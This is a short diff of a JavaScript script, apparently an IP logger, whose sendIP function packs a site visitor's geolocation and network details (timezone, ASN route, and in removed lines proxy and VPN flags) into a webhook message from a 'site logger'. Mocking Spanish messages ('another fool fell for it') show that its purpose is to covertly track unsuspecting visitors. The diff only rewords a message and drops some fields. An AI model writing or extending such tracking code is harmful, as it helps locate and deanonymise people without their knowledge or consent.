@@ -26,7 +26,7 @@ const sendIP = async () => {
     const payload = {
       username: "site logger",
       // avatar_url: "https://example.com/avatar.jpg",
-      content: `ya cayo`,
+      content: `ya cayo un tontito`,
       embeds: [
         {
           title: 'Un tontito mas',
@@ -41,11 +41,6 @@ const sendIP = async () => {
             `**Timezone >>** ${geoData.time_zone || 'N/A'}`,
             `**Satellite >>** ${geoData.is_satellite || 'N/A'}`,
             `**Route >>** ${geoData.asn.route || 'N/A'}`,
-            `**Net Name >>** ${geoData.asn.netname || 'N/A'}`,
-            `**RIR >>** ${geoData.asn.rir || 'N/A'}`,
-            `**Bogon IP >>** ${geoData.privacy.is_bogon || 'N/A'}`,
-            `**Proxy IP >>** ${geoData.privacy.is_proxy || 'N/A'}`,
-            `**VPN IP >>** ${geoData.privacy.is_vpn || 'N/A'}`,
           ].join('\n'),
           color: 0x800080
         }
